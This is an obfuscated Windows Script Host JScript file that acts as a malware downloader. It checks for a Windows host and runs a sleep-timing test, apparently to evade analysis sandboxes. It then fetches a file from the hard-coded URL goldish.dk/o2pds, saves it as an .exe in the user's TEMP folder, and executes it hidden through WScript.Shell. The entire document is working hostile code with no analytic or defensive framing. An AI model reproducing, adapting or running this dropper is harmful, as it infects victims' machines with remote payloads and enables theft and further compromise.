var _F = false;
var _KB = "CreateObject";
var _K = function _FU() {return WScript[_KB]("WScript"+".Shell");}(), _GX = 11;
var _Y = "MSXML2.XMLHTTP";
var _H = 2123213;
var _MV = 0;
function _FV(_HX){_K["Run"](_HX, _MV, _MV);};
function _L(){return _Y + "";};
function _LW(_OM, _C){_MV = _MV * 1; return _OM - _C;};
function _T(){return _KB;};
/*@cc_on
  @if (@_win32 || @_win64)
    _F = true;
  @end
@*/
if (_F)
{
var _WV = "";
function _O(){return 22;};
var _EW = 0; var _MD = 0;
function _IL()
{
var _J0 = new this["Date"]();
var _G = _J0["getUTCMilliseconds"]();
WScript["Sleep"](_O());
var _J0 = new this["Date"]();
var _WG = _J0["getUTCMilliseconds"]();
WScript["Sleep"](_O());
var _J0 = new this["Date"]();
var _I = _J0["getUTCMilliseconds"]();
var _EW = "_A";
_EW = _LW(_WG, _G);
var _MD = "_YW";
_MD = _LW(_I, _WG);
_WV = "open";
return _LW(_EW, _MD);
}
var _W = false;
var _E = false;
for (var _TS = _MV; _TS < _O() * 1; _TS++){if (_IL() != _MV){
_W = true; 
_MD = "31" + 11 * _EW + _MD; 
_E = true; 
break;
}}
function _OS() {return ((_W == true) && (_W == _E)) ? 1 : _MV;};
if (_W && _OS() && _E){
function _ON() {return _K["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "QPeU9vgTfA.ex" + "e";};
 _MX = _L();
 _YJ = WScript[_KB](_MX);
 var _J = 1;
 while (_J){
try {
	if (_J == 1)
	{
		_YJ[_WV]("GET", "http://goldish.dk/o2pds", false);
		_YJ["send"]();
		_XZ = "Sleep";
	}
	WScript[_XZ](_O() + 120); 
	if (_YJ["readystate"] < 2 * 2) continue;
	_J = _MV;
	function _LB(_Q) {var _KO = (1, 2, 3, 4, 5, _Q); return _KO;};
	_Y0 = WScript[_T()]("ADODB.Stream");
	_MX = _Y0;
	_MX[_WV]();
	_MX["type"] = _LB(1);
	_MX["write"](_YJ["ResponseBody"]);
	_Y0["position"] = _LB(_MV);
	_MX["Save" + "ToFile"](_ON(), 2);
	_Y0["cl"+"ose"]();
	_XO = _ON();
	_FV(_XO);
} catch(_AR){};
}
}
}

